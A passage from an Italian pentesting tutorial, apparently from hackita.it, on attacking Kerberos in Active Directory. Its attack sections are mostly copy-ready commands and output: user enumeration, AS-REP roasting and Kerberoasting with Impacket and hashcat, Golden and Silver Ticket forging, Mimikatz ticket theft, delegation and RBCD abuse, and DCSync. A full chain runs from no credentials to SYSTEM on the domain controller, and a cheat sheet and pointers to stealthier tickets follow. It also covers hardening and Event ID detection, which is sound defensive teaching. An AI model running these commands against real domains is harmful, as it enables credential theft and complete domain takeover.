    dns_lookup_realm = false
    dns_lookup_kdc = true
    rdns = false

[realms]
    CORP.LOCAL = {
        kdc = dc01.corp.local
        admin_server = dc01.corp.local
    }

[domain_realm]
    .corp.local = CORP.LOCAL
    corp.local = CORP.LOCAL
EOF

# Make sure the domain controller name resolves
echo "10.10.10.10 dc01.corp.local corp.local" | sudo tee -a /etc/hosts
```

Ora testa l'autenticazione Kerberos: chiedi un TGT con `kinit` e verificalo con `klist`:

```bash
# Request a TGT for the user
kinit j.rossi@CORP.LOCAL

# Show the tickets in the credential cache
klist
```

```text
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: j.rossi@CORP.LOCAL

Valid starting     Expires            Service principal
11/05/26 14:00:01  11/06/26 00:00:01  krbtgt/CORP.LOCAL@CORP.LOCAL
```

Se vedi il ticket `krbtgt/CORP.LOCAL@CORP.LOCAL`, l'autenticazione Kerberos funziona. Lo stesso TGT lo ottieni anche con [getTGT](https://hackita.it/articoli/gettgt/) di Impacket, partendo da password o hash. Da qui puoi usare qualsiasi tool con `-k`:

```bash
# Use the cached ticket against a service (hostname, never the IP)
export KRB5CCNAME=/tmp/krb5cc_1000
impacket-smbclient -k -no-pass corp.local/j.rossi@dc01.corp.local
```

Su Windows gli stessi controlli si fanno con `klist` (elenca i ticket), `klist tgt` (mostra il TGT) e `klist purge` (cancella la cache, utile per forzare una nuova autenticazione).

## Attacchi Kerberos: enumerazione, roasting e ticket forging

Gli attacchi a Kerberos si dividono in tre famiglie, e le sezioni seguenti rispettano questo ordine:

* **Enumerazione**: trovi KDC, utenti validi e SPN senza credenziali o con un account qualsiasi (sezione 1).
* **Attacchi alle credenziali**: AS-REP Roasting (sezione 2) e Kerberoasting (sezioni 2b e 3) ti restituiscono hash da craccare offline.
* **Ticket forging e abuso**: Golden Ticket, Silver Ticket, Pass-the-Ticket e delegation abuse (sezioni 4-7).

## 1. Enumerazione di Kerberos

### Nmap: trovare la porta Kerberos TCP e UDP

```bash
# TCP scan with service detection
nmap -sV -p 88 10.10.10.10

# Kerberos also listens on UDP: scan both
nmap -sS -sU -p T:88,U:88 10.10.10.10
```

```text
PORT   STATE SERVICE      VERSION
88/tcp open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-11-05 13:00:00Z)
88/udp open  kerberos-sec
```

La porta 88 aperta indica un KDC. Se Nmap riporta `Microsoft Windows Kerberos` è quasi certamente un Domain Controller Active Directory. Se non indica Microsoft può essere un KDC MIT: controlla anche 464 e 749.

Un dettaglio utile: la riga `server time` ti dà l'orario del DC, perfetto per sistemare lo skew del tuo orologio.

### Enumerazione utenti, SENZA credenziali

Kerberos risponde in modo diverso per utenti validi e inesistenti (`KDC_ERR_C_PRINCIPAL_UNKNOWN` contro una richiesta di pre-autenticazione). Questo permette di enumerare utenti senza alcuna credenziale:

```bash
# Kerbrute: username enumeration
kerbrute userenum -d corp.local --dc 10.10.10.10 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
```

```text
2026/02/14 10:00:01 >  [+] VALID USERNAME: administrator@corp.local
2026/02/14 10:00:01 >  [+] VALID USERNAME: j.rossi@corp.local
2026/02/14 10:00:02 >  [+] VALID USERNAME: m.bianchi@corp.local
2026/02/14 10:00:02 >  [+] VALID USERNAME: svc_sql@corp.local
2026/02/14 10:00:03 >  [+] VALID USERNAME: svc_backup@corp.local
```

Cinque utenti validi, inclusi due service account (`svc_sql`, `svc_backup`). Tutto senza credenziali, e senza generare gli eventi di login fallito che un brute force classico produrrebbe.

```bash
# Same thing with Nmap
nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=corp.local,userdb=users.txt 10.10.10.10

# Build a user list through SMB null/guest session with NetExec
nxc smb 10.10.10.10 -u guest -p '' --rid-brute 10000
```

[NetExec](https://hackita.it/articoli/netexec/) con sessione guest o con credenziali valide ti dà la lista utenti da dare in pasto a `kerbrute` e a `GetNPUsers`.

## 2. AS-REP Roasting: hash senza credenziali

Se un utente ha **"Do not require Kerberos preauthentication"** abilitato (flag `DONT_REQUIRE_PREAUTH`), puoi richiedere il suo AS-REP senza conoscere la password. L'AS-REP contiene un blob cifrato con l'hash della password dell'utente, craccabile offline con [Hashcat](https://hackita.it/articoli/hashcat/). Per la guida dedicata vedi [AS-REP Roasting](https://hackita.it/articoli/as-rep-roasting/).

```bash
# Impacket: find users without pre-auth and extract their hashes
impacket-GetNPUsers corp.local/ -dc-ip 10.10.10.10 -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt
```

```text
$krb5asrep$23$svc_backup@CORP.LOCAL:abc123...hash...def456
```

```bash
# Crack with Hashcat (mode 18200)
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

```text
$krb5asrep$23$svc_backup@CORP.LOCAL:Backup2023!
```

### Senza lista utenti

```bash
# With any valid account (even low-privileged), LDAP finds who has the flag
impacket-GetNPUsers corp.local/j.rossi:Password1 -dc-ip 10.10.10.10 -request

# Same result with NetExec
nxc ldap 10.10.10.10 -u j.rossi -p 'Password1' --asreproast asrep.txt
```

Con un account qualsiasi, [LDAP](https://hackita.it/articoli/porta-389-ldap/) trova automaticamente tutti gli utenti con `DONT_REQUIRE_PREAUTH` ed estrae tutti gli hash in un colpo. Lo script che fa questo lavoro è [GetNPUsers](https://hackita.it/articoli/getnpusers/).

## 2b. Kerberoasting senza credenziali (via AS-REP)

Se esiste un utente con `DONT_REQUIRE_PREAUTH`, puoi usarlo per richiedere TGS di altri account **senza avere nessuna credenziale valida**, anche se non riesci a crackare il suo hash.

```bash
# Step 1: find users without pre-auth
impacket-GetNPUsers corp.local/ -dc-ip 10.10.10.10 -usersfile users.txt -format hashcat

# Step 2: use that user as a lever to kerberoast the others
impacket-GetUserSPNs -no-preauth svc_backup -usersfile users.txt -dc-host 10.10.10.10 corp.local/
```

L'hash ottenuto nello Step 1 **non serve craccarlo**: serve solo il nome utente come leva per lo Step 2. In `users.txt` devi avere una lista di utenti: generala prima con `nxc smb 10.10.10.10 -u guest -p '' --rid-brute 10000`, oppure con lo stesso comando ma con credenziali valide.

> **Nota:** questa tecnica funziona solo se nel dominio esiste almeno un account con `DONT_REQUIRE_PREAUTH` e almeno un service account con SPN registrato.

## 3. Kerberoasting: hash di service account

Qualsiasi utente autenticato nel dominio può richiedere un TGS per qualsiasi servizio con un SPN registrato. Il TGS è cifrato con l'hash della password del service account, quindi è craccabile offline. Questo è il [Kerberoasting](https://hackita.it/articoli/kerberoasting/) e funziona su ogni dominio AD che ha service account con SPN.

```bash
# Impacket: the most common method
impacket-GetUserSPNs corp.local/j.rossi:Password1 -dc-ip 10.10.10.10 -request -outputfile kerberoast_hashes.txt

# Same thing with NetExec
nxc ldap 10.10.10.10 -u j.rossi -p 'Password1' --kerberoasting kerberoast_hashes.txt
```

```text
ServicePrincipalName       Name        MemberOf                         PasswordLastSet
MSSQLSvc/db01:1433         svc_sql     CN=Domain Admins,CN=Users,...    2019-03-15
HTTP/web01.corp.local      svc_web     CN=Web Admins,CN=Users,...       2021-06-20
cifs/file01.corp.local     svc_file    CN=Backup Operators,CN=...      2020-01-10

$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/db01:1433*$abc123...
$krb5tgs$23$*svc_web$CORP.LOCAL$HTTP/web01.corp.local*$def456...
$krb5tgs$23$*svc_file$CORP.LOCAL$cifs/file01.corp.local*$ghi789...
```

**Intelligence critica:** `svc_sql` è **Domain Admin** e la sua password non è cambiata dal 2019, 7 anni. Il target perfetto.

```bash
# Crack with Hashcat: 13100 for RC4, 19600 for AES128, 19700 for AES256
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
```

```text
$krb5tgs$23$*svc_sql$CORP.LOCAL$...*:SqlProd2019!
```

`svc_sql` è Domain Admin con password `SqlProd2019!`. Dominio compromesso.

Il numero `23` nell'hash è il tipo di cifratura (RC4). Se vedi `17` o `18` sono AES128 e AES256: molto più lenti da craccare, ed è il motivo per cui disabilitare RC4 è una delle difese migliori.

```text
# With Rubeus (from a Windows machine)
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Show statistics first: how many accounts, which encryption types
.\Rubeus.exe kerberoast /stats

# Targeted kerberoast (a single user)
.\Rubeus.exe kerberoast /user:svc_sql /outfile:hash_sql.txt
```

Maggiori dettagli su [Rubeus](https://hackita.it/articoli/rubeus/) nella guida dedicata e su [GetUserSPNs](https://hackita.it/articoli/getuserspns/) per la versione Impacket.

## 4. Golden Ticket: persistenza totale

Se ottieni l'hash NTLM dell'account `krbtgt` (tramite [DCSync](https://hackita.it/articoli/dcsync/) o dump di NTDS.dit con [secretsdump](https://hackita.it/articoli/secretsdump/)), puoi forgiare TGT validi per **qualsiasi utente**, inclusi utenti inesistenti con qualsiasi gruppo. È il livello di persistenza più alto in Active Directory: sopravvive al reset delle password degli utenti, finché `krbtgt` non viene ruotata. Approfondimento: [Golden Ticket](https://hackita.it/articoli/golden-ticket/).

```bash
# Get the krbtgt hash (requires Domain Admin)
impacket-secretsdump corp.local/administrator@10.10.10.10 -hashes 'aad3b435b51404ee:NTLM_HASH' -just-dc-user krbtgt

# Get the domain SID
impacket-lookupsid corp.local/j.rossi:Password1@10.10.10.10 0
```

```text
krbtgt:502:aad3b435b51404ee:f3bc61e97fb14d1c30ac3d1b51c2345e:::
[*] Domain SID is: S-1-5-21-1234567890-1234567890-1234567890
```

```bash
# Forge the Golden Ticket with Impacket
impacket-ticketer -nthash f3bc61e97fb14d1c30ac3d1b51c2345e -domain-sid S-1-5-21-1234567890-1234567890-1234567890 -domain corp.local administrator
```

```bash
# Use the ticket
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass corp.local/administrator@dc01.corp.local
```

Shell SYSTEM sul Domain Controller con un ticket forgiato. L'unico modo per invalidarlo: reset della password di `krbtgt` **due volte** (la prima volta invalida i ticket vecchi, la seconda invalida quelli emessi tra il primo e il secondo reset).

```text
# With Mimikatz (from Windows)
mimikatz # kerberos::golden /user:administrator /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:f3bc61e97fb14d1c30ac3d1b51c2345e /ptt
```

Su [Mimikatz](https://hackita.it/articoli/mimikatz/) trovi la guida completa. Il SID del dominio si ricava con [lookupsid](https://hackita.it/articoli/lookupsid/) e per forgiare ticket da Linux serve [ticketer](https://hackita.it/articoli/ticketer/). Se vuoi un ticket più difficile da individuare per i sistemi di detection, guarda il [Diamond Ticket](https://hackita.it/articoli/diamond-ticket/) e il [Sapphire Ticket](https://hackita.it/articoli/sapphire-ticket/).

## 5. Silver Ticket: accesso mirato

Il Silver Ticket forgia un TGS per un servizio specifico usando l'hash dell'account del servizio (non di `krbtgt`). È più stealth del Golden Ticket perché non genera nessuna richiesta verso il KDC. Dettagli nella guida [Silver Ticket](https://hackita.it/articoli/silver-ticket/).

```bash
# Silver Ticket to reach CIFS (file share) on file01
impacket-ticketer -nthash HASH_SVC_FILE -domain-sid S-1-5-21-1234567890-1234567890-1234567890 -domain corp.local -spn cifs/file01.corp.local administrator

export KRB5CCNAME=administrator.ccache
impacket-smbclient -k -no-pass corp.local/administrator@file01.corp.local
```

## 6. Pass-the-Ticket

Se trovi un ticket Kerberos (TGT o TGS) sulla macchina compromessa, puoi riusarlo senza conoscere nessuna password:

```text
# Mimikatz: export all the tickets from memory
mimikatz # sekurlsa::tickets /export

# Inject a stolen ticket
mimikatz # kerberos::ptt ticket_admin.kirbi
```

```bash
# Impacket: convert a .kirbi ticket to .ccache for Linux
impacket-ticketConverter ticket.kirbi ticket.ccache
export KRB5CCNAME=ticket.ccache
impacket-psexec -k -no-pass corp.local/administrator@dc01.corp.local
```

## 7. Delegation abuse

Le delegazioni Kerberos permettono a un servizio di agire per conto di un utente. Se mal configurate portano a privilege escalation.

**Unconstrained Delegation:** il servizio riceve il TGT dell'utente e può impersonarlo ovunque.

```bash
# Find machines and accounts with delegation configured
impacket-findDelegation corp.local/j.rossi:Password1 -dc-ip 10.10.10.10
```

```text
AccountName    AccountType  DelegationType              DelegationRightsTo
WEB-01$        Computer     Unconstrained               N/A
SVC_SQL        User         Constrained                 MSSQLSvc/db01:1433
```

**Constrained Delegation abuse** con Impacket ([getST](https://hackita.it/articoli/getst/)) o Rubeus:

```bash
# Impacket: get a service ticket as administrator for the delegated service
impacket-getST -spn MSSQLSvc/db01.corp.local -impersonate administrator corp.local/svc_sql:'SqlProd2019!' -dc-ip 10.10.10.10
export KRB5CCNAME=administrator@MSSQLSvc_db01.corp.local@CORP.LOCAL.ccache
impacket-mssqlclient -k -no-pass db01.corp.local
```

```text
# Rubeus: S4U from Windows
.\Rubeus.exe s4u /user:svc_sql /rc4:HASH /impersonateuser:administrator /msdsspn:MSSQLSvc/db01:1433 /ptt
```

Ora sei `administrator` per il servizio SQL: vedi anche [pentesting MSSQL](https://hackita.it/articoli/porta-1433-mssql/).

**Resource-Based Constrained Delegation (RBCD):** se hai il permesso di scrivere l'attributo `msDS-AllowedToActOnBehalfOfOtherIdentity` su un computer, puoi autorizzare un tuo computer fittizio a impersonare chiunque su quella macchina. Guida completa: [RBCD](https://hackita.it/articoli/rbcd/). Il computer fittizio si crea con [addcomputer](https://hackita.it/articoli/addcomputer/).

```bash
# Create a machine account you control
impacket-addcomputer corp.local/j.rossi:Password1 -dc-ip 10.10.10.10 -computer-name 'FAKEPC$' -computer-pass 'FakePass123!'

# Allow FAKEPC$ to act on behalf of users on WEB-01$
impacket-rbcd corp.local/j.rossi:Password1 -dc-ip 10.10.10.10 -delegate-from 'FAKEPC$' -delegate-to 'WEB-01$' -action write

# Request a ticket as administrator for WEB-01
impacket-getST corp.local/'FAKEPC$':'FakePass123!' -dc-ip 10.10.10.10 -spn cifs/web-01.corp.local -impersonate administrator
```

## 8. Analizzare il traffico Kerberos con Wireshark

Per capire cosa succede davvero (e per riconoscere errori) cattura il traffico sulla porta 88:

```bash
# Capture Kerberos traffic and decode it
sudo tshark -i eth0 -f "port 88" -Y kerberos

# In Wireshark, use this display filter
# kerberos
```

Nel pacchetto vedi i messaggi `AS-REQ`, `AS-REP`, `TGS-REQ`, `TGS-REP`, il tipo di cifratura (`etype`) e gli errori del KDC. Un `AS-REQ` senza `PA-ENC-TIMESTAMP` seguito da un `AS-REP` è la firma di un account senza pre-autenticazione. Vedi anche le guide a [Wireshark](https://hackita.it/articoli/wireshark/) e [tshark](https://hackita.it/articoli/tshark/).

## 9. Errori di autenticazione Kerberos: cause comuni e soluzioni

Quando un attacco o una configurazione non funziona, quasi sempre il motivo è uno di questi:

| Errore                        | Significato                                  | Soluzione                                      |
| ----------------------------- | -------------------------------------------- | ---------------------------------------------- |
| `KRB_AP_ERR_SKEW`             | Orologio sfasato di più di 5 minuti          | `sudo ntpdate DC_IP`                           |
| `KDC_ERR_C_PRINCIPAL_UNKNOWN` | L'utente non esiste nel realm                | Controlla nome utente e realm                  |
| `KDC_ERR_PREAUTH_FAILED`      | Password errata                              | Controlla la password (conta per il lockout)   |
| `KDC_ERR_S_PRINCIPAL_UNKNOWN` | SPN inesistente                              | Usa il nome DNS corretto del servizio          |
| `KDC_ERR_CLIENT_REVOKED`      | Account disabilitato o bloccato              | Verifica lo stato dell'account                 |
| `KDC_ERR_ETYPE_NOSUPP`        | Tipo di cifratura non supportato             | Prova con `-aesKey` invece di `-nthash`        |
| `KRB_AP_ERR_MODIFIED`         | Il servizio non riesce a decifrare il ticket | SPN duplicato o password dell'account cambiata |

Su Windows, l'**Event ID 4** della sorgente `Security-Kerberos` nel log di Sistema segnala proprio `KRB_AP_ERR_MODIFIED`: nella pratica quasi sempre indica un SPN registrato su due account. Lo si trova con:

```text
setspn -X
```

Altri Event ID da conoscere sul Domain Controller: **4768** (richiesta TGT), **4769** (richiesta TGS), **4771** (pre-autenticazione fallita).

## 10. Micro playbook reale

**Minuto 0-3: conferma DC ed enumerazione utenti**

```bash
nmap -sV -p 88,389,445 10.10.10.10
kerbrute userenum -d corp.local --dc 10.10.10.10 users.txt
```

**Minuto 3-10: AS-REP Roasting (non serve autenticazione)**

```bash
impacket-GetNPUsers corp.local/ -dc-ip 10.10.10.10 -usersfile users_trovati.txt -format hashcat -outputfile asrep.txt
hashcat -m 18200 asrep.txt rockyou.txt
```

**Minuto 10-20: Kerberoasting (serve qualsiasi credenziale)**

```bash
impacket-GetUserSPNs corp.local/USER:PASS -dc-ip 10.10.10.10 -request -outputfile kerb.txt
hashcat -m 13100 kerb.txt rockyou.txt
```

**Se ottengo Domain Admin: Golden Ticket per persistenza**

```bash
impacket-secretsdump corp.local/admin@DC -just-dc-user krbtgt
impacket-ticketer -nthash KRBTGT_HASH -domain-sid SID -domain corp.local fakeadmin
```

Questo è il mio flusso standard in ogni pentest AD. In 20 minuti ho una lista di hash da crackare offline senza aver generato un singolo alert di lockout.

## 11. Caso studio concreto

**Settore:** banca regionale, 3000 utenti, policy password 12 caratteri complessa.

**Scope:** pentest interno, accesso a una workstation con credenziali standard `g.verdi:Welcome1!`.

Ho iniziato con Kerberoasting: `GetUserSPNs` ha restituito 47 service account con SPN. Ho crackato gli hash offline: 12 su 47 sono caduti in meno di un'ora. Il primo a cadere: `svc_sqlprod` con password `SqlProd2019!`, conforme alla policy (12 caratteri, maiuscola, numero, speciale) ma vecchia di 6 anni e mai ruotata.

`svc_sqlprod` era membro di **Domain Admins**, pratica comune per i service account SQL che "devono accedere a tutto". Con quell'account ho fatto DCSync, estratto tutti gli hash NTLM del dominio (3000 utenti) e forgiato un Golden Ticket.

**Tempo dal login alla compromissione del dominio:** 2 ore e 40 minuti, di cui 2 ore per il cracking Hashcat.

**Root cause:** service account Domain Admin con password statica vecchia di 6 anni. Nessun monitoraggio del Kerberoasting (Event ID 4769 con cifratura RC4). Nessuna rotazione automatica delle password dei service account.

## 12. Errori comuni reali trovati nei pentest

**1. Service account Domain Admin (80% dei domini).** L'errore più diffuso in assoluto. `svc_sql`, `svc_backup`, `svc_scom` sono Domain Admin "perché era più facile". Kerberoasting più cracking uguale dominio compromesso.

**2. Password statiche sui service account.** Le password dei service account non vengono mai cambiate. Trovo regolarmente password del 2017-2019 su ambienti attuali. Il Group Managed Service Account (gMSA) risolve il problema ma pochissimi lo usano.

**3. Utenti con DONT\_REQUIRE\_PREAUTH.** Il flag "Do not require Kerberos preauthentication" abilitato per "risolvere un problema di compatibilità" e mai rimosso. AS-REP Roasting senza credenziali.

**4. Unconstrained Delegation su server non-DC.** Macchine con unconstrained delegation: un attaccante forza un Domain Controller ad autenticarsi (PrinterBug/PetitPotam) e cattura il TGT del DC, quindi Golden Ticket.

**5. AES contro RC4.** I ticket Kerberos cifrati con RC4 (hash NTLM) sono molto più veloci da crackare rispetto ad AES. La maggior parte dei domini permette ancora RC4 per retrocompatibilità. Un Domain Controller che accetta RC4 rende il Kerberoasting molto più veloce.

**6. Nessun monitoraggio degli Event ID Kerberos.** L'Event ID 4769 (richiesta TGS) con encryption type 0x17 (RC4) è il segnale classico del Kerberoasting. Quasi nessuno lo monitora.

## 13. Mini chain offensiva reale

```text
Kerberos :88 → User Enum → AS-REP Roast → Credenziali → Kerberoast → DA → DCSync → Golden Ticket
```

**Step 1: enumerazione utenti senza credenziali**

```bash
kerbrute userenum -d corp.local --dc 10.10.10.10 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
# 25 valid users, including 3 service accounts
```

**Step 2: AS-REP Roasting**

```bash
impacket-GetNPUsers corp.local/ -dc-ip 10.10.10.10 -usersfile utenti_validi.txt -format hashcat
# svc_backup has DONT_REQUIRE_PREAUTH, hash extracted
hashcat -m 18200 asrep.txt rockyou.txt
# svc_backup:Backup2023!
```

**Step 3: Kerberoasting con le credenziali ottenute**

```bash
impacket-GetUserSPNs corp.local/svc_backup:Backup2023! -dc-ip 10.10.10.10 -request
# 47 TGS hashes extracted
hashcat -m 13100 kerberoast.txt rockyou.txt
# svc_sqlprod:SqlProd2019! (Domain Admin)
```

**Step 4: DCSync e Golden Ticket**

```bash
impacket-secretsdump corp.local/svc_sqlprod:SqlProd2019!@10.10.10.10 -just-dc-ntlm
# krbtgt hash and all user hashes
impacket-ticketer -nthash KRBTGT_HASH -domain-sid SID -domain corp.local fakeadmin
export KRB5CCNAME=fakeadmin.ccache
impacket-psexec -k -no-pass corp.local/fakeadmin@dc01.corp.local
# SYSTEM on the Domain Controller
```

**Partito senza credenziali, arrivato a Domain Admin con persistenza permanente.** Tutto tramite la porta 88. Per mappare i percorsi verso Domain Admin in modo sistematico usa [BloodHound](https://hackita.it/articoli/bloodhound/).

## 14. Cheat sheet finale

| Azione             | Comando                                                                         |
| ------------------ | ------------------------------------------------------------------------------- |
| Nmap TCP/UDP       | `nmap -sS -sU -p T:88,U:88 target`                                              |
| Trova KDC (DNS)    | `dig SRV _kerberos._tcp.DOMAIN`                                                 |
| Sync orologio      | `sudo ntpdate DC`                                                               |
| Ottieni TGT        | `kinit user@REALM`                                                              |
| Mostra ticket      | `klist`                                                                         |
| User enum          | `kerbrute userenum -d DOMAIN --dc DC users.txt`                                 |
| AS-REP Roast       | `impacket-GetNPUsers DOMAIN/ -dc-ip DC -usersfile users.txt -format hashcat`    |
| Crack AS-REP       | `hashcat -m 18200 hashes.txt wordlist`                                          |
| Kerberoast         | `impacket-GetUserSPNs DOMAIN/user:pass -dc-ip DC -request`                      |
| Crack TGS (RC4)    | `hashcat -m 13100 hashes.txt wordlist`                                          |
| Crack TGS (AES256) | `hashcat -m 19700 hashes.txt wordlist`                                          |
| Golden Ticket      | `impacket-ticketer -nthash KRBTGT_HASH -domain-sid SID -domain DOM admin`       |
| Silver Ticket      | `impacket-ticketer -nthash SVC_HASH -domain-sid SID -domain DOM -spn SPN admin` |
| Pass-the-Ticket    | `export KRB5CCNAME=ticket.ccache` poi `impacket-psexec -k -no-pass`             |
| Delegation         | `impacket-findDelegation DOMAIN/user:pass -dc-ip DC`                            |
| Rubeus Kerberoast  | `Rubeus.exe kerberoast /outfile:hashes.txt`                                     |
| Rubeus S4U         | `Rubeus.exe s4u /user:SVC /rc4:HASH /impersonateuser:admin /msdsspn:SPN /ptt`   |
| DCSync             | `impacket-secretsdump DOMAIN/admin@DC -just-dc-ntlm`                            |

Per gli strumenti usati in questa guida vedi anche [Impacket](https://hackita.it/articoli/impacket/) e [Nmap](https://hackita.it/articoli/nmap/).

## 15. Kerberos è sicuro? Vulnerabilità, detection e hardening

Il protocollo Kerberos, come disegno, è solido: nessuna password in chiaro sulla rete, autenticazione mutua, ticket a scadenza. Le **vulnerabilità di Kerberos** quasi mai stanno nel protocollo, stanno nell'ambiente intorno: password deboli sui service account, RC4 ancora abilitato, delegazioni troppo generose, `krbtgt` mai ruotata, nessun monitoraggio.

Una buona difesa si costruisce su due livelli: ridurre la superficie e vedere quando qualcuno attacca.

**Riduci la superficie**

* **gMSA**: Group Managed Service Accounts con rotazione automatica della password.
* **Rimuovi i service account da Domain Admins**: principio del minimo privilegio.
* **Disabilita RC4** dove possibile e forza AES-256: rende molto più lento il [cracking dei ticket del Kerberoasting](https://hackita.it/articoli/kerberoasting/).
* **Password lunghe (oltre 25 caratteri) per i service account**: rende il cracking impraticabile.
* **Rimuovi DONT\_REQUIRE\_PREAUTH** da tutti gli utenti.
* **Elimina l'unconstrained delegation** sulle macchine non-DC.
* **Protected Users group** per gli account privilegiati.
* **Reset di `krbtgt`** periodicamente (dopo un breach: due volte, con attesa tra i due).
* **Abbassa la superficie NTLM**: più riduci NTLM, meno Kerberos si trova a ripiegare e meno relay sono possibili.
* **Sincronizza gli orologi** con una sola sorgente fidata, per evitare errori e finestre di replay.

**Vedi quando succede**

| Attacco                 | Event ID  | Cosa cercare                                                    |
| ----------------------- | --------- | --------------------------------------------------------------- |
| Kerberoasting           | 4769      | Encryption type `0x17` (RC4), molte richieste da un solo utente |
| AS-REP Roasting         | 4768      | Richieste TGT senza pre-autenticazione                          |
| Brute force su Kerberos | 4771      | Molte pre-autenticazioni fallite (`0x18`)                       |
| Golden Ticket           | 4768/4769 | Ticket con durata anomala o per utenti inesistenti              |
| Enumerazione utenti     | 4768      | Raffica di richieste TGT per nomi diversi                       |

Riferimenti: [RFC 4120](https://www.rfc-editor.org/rfc/rfc4120), MIT Kerberos documentation, MITRE ATT\&CK T1558. Uso esclusivo in ambienti autorizzati.

## 16. FAQ su Kerberos

**Cos'è l'autenticazione Kerberos?** È il processo con cui un utente dimostra chi è a un servizio di rete senza mandargli la password: ti autentichi una sola volta presso il KDC, ricevi un TGT e con quello ottieni i ticket per i singoli servizi. È il metodo di autenticazione predefinito di Active Directory.

**Qual è la porta di Kerberos?** La porta 88, sia TCP sia UDP. La 464 serve al cambio password (`kpasswd`) e la 749 all'amministrazione `kadmind` nelle installazioni MIT Kerberos. Le porte 389 e 445 non sono Kerberos: sono LDAP e SMB.

**La porta 88 è TCP o UDP?** Entrambe. Il client usa UDP per i messaggi piccoli e passa a TCP quando il ticket è troppo grande per un datagramma. Se uno dei due è bloccato dal firewall, Kerberos funziona in modo intermittente.

**Cos'è il KDC in Kerberos?** È il Key Distribution Center, il servizio che rilascia TGT e ticket di servizio. In Active Directory coincide con il Domain Controller.

**Cosa sono TGT e TGS?** Il [TGT](https://hackita.it/articoli/tgt/) dimostra che ti sei autenticato; il [TGS](https://hackita.it/articoli/tgs/) (ticket di servizio) lo richiedi con il TGT per accedere a un servizio specifico.

**Cos'è un Service Ticket?** È il ticket di servizio (TGS) che ti serve per entrare in un servizio specifico come SMB, HTTP o MSSQL. Lo richiedi al KDC presentando un TGT valido ed è cifrato con la chiave dell'account del servizio.

**Qual è la differenza tra Kerberos e NTLM?** Kerberos usa ticket rilasciati da un KDC e offre autenticazione mutua; NTLM usa challenge-response e il server deve contattare il DC a ogni verifica. NTLM è la scelta di ripiego quando ti connetti con l'IP o il servizio non supporta Kerberos.

**Qual è la differenza tra Kerberos e LDAP?** Kerberos autentica, LDAP interroga la directory. In Active Directory lavorano insieme e non si sostituiscono.

**Cos'è la pre-autenticazione Kerberos?** Il client dimostra di conoscere la password cifrando un timestamp nell'AS-REQ. Se è disattivata per un utente, chiunque può chiedere il suo AS-REP e craccarlo offline (AS-REP Roasting).

**Il Kerberoasting genera alert?** Non di default: è una richiesta TGS legittima. Però genera l'Event ID 4769 con encryption type RC4 (0x17), che è anomalo se il dominio supporta AES. Pochi ambienti monitorano questo evento, ma i SOC evoluti lo fanno.

**Posso fare Kerberoasting senza credenziali?** Normalmente serve almeno un account autenticato nel dominio. Esiste però l'eccezione descritta nella sezione 2b: se nel dominio c'è un utente con `DONT_REQUIRE_PREAUTH`, puoi usarlo come leva per richiedere i TGS senza credenziali valide. Altrimenti le credenziali le ottieni con AS-REP Roasting o con [Responder](https://hackita.it/articoli/responder/).

**Come si testa l'autenticazione Kerberos?** Da Linux con `kinit utente@REALM` e `klist`: se compare il ticket `krbtgt`, funziona. Da Windows con `klist`.

**Come configuro Kerberos su Linux?** Sincronizza l'orologio con il Domain Controller, imposta realm e KDC in `/etc/krb5.conf`, fai risolvere il nome del DC e ottieni un TGT con `kinit`. I passaggi completi sono nella sezione di configurazione.

**Quali sono gli errori Kerberos più comuni?** `KRB_AP_ERR_SKEW` (orologio sfasato), `KDC_ERR_PREAUTH_FAILED` (password errata), `KDC_ERR_S_PRINCIPAL_UNKNOWN` (SPN inesistente) e `KRB_AP_ERR_MODIFIED` (SPN duplicato o password cambiata). La tabella con le soluzioni è nella sezione 9.

**Cos'è il Golden Ticket e come lo invalido?** Un TGT forgiato con l'hash di `krbtgt`, valido per qualsiasi utente e gruppo (guida: [Golden Ticket](https://hackita.it/articoli/golden-ticket/)). L'unico modo per invalidarlo è resettare la password di `krbtgt` due volte consecutive. La prima invalidazione richiede fino a 10 ore per propagarsi.

**Kerberos è sicuro?** Il protocollo è robusto, ma gli ambienti reali no: password deboli sui service account, RC4 abilitato, delegazioni eccessive e mancanza di monitoraggio sono i problemi che gli attaccanti sfruttano ogni giorno.
